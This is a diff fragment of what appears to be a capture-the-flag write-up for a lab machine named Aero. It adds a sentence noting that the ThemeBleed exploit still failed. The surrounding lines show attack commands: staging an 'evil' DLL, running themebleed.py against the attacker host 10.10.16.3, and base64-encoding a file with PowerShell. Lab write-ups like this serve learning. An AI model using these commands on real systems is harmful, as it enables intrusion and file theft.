@@ -3498,7 +3498,7 @@ $ cp VerifyThemeVersion.dll Aero.msstyles_vrf_evil.dll
 $ python3 themebleed.py -r 10.10.16.3 --no-dll
 </code></pre>
 <p><img alt="alt text" src="../assets/Aero/image4.png" /></p>
-<p>I compared the <code>.theme</code> files created by these two different repos. They are same. So, the probably reason might be <code>socat</code> didn't forward 445 port properly.</p>
+<p>I compared the <code>.theme</code> files created by these two different repos. They are same. So, the probably reason might be <code>socat</code> didn't forward 445 port properly. But when I ran the exploit on Wins, it still didn't work, so it might be the repo didn't work on my circumstance.</p>
 <h2 id="user-samemerson">User sam.emerson</h2>
 <p><img alt="alt text" src="../assets/Aero/image5.png" /></p>
 <pre><code class="language-bash">&gt; $b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes(&quot;CVE-2023-28252_Summary.pdf&quot;))
